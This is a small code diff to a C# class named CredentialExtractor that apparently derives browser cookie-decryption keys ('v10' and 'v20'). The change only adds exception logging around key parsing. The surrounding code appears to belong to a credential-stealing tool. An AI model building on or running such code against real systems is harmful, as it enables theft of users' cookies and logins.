@@ -112,7 +112,11 @@ public static class CredentialExtractor
                     v20Key = CookieExtractorDeriveV20Key(abKeyB64);
             }
         }
-        catch { return creds; }
+        catch (Exception ex)
+        {
+            Log($"Key parsing exception: {ex}");
+            return creds;
+        }
 
         if (v10Key == null && v20Key == null) return creds;
 
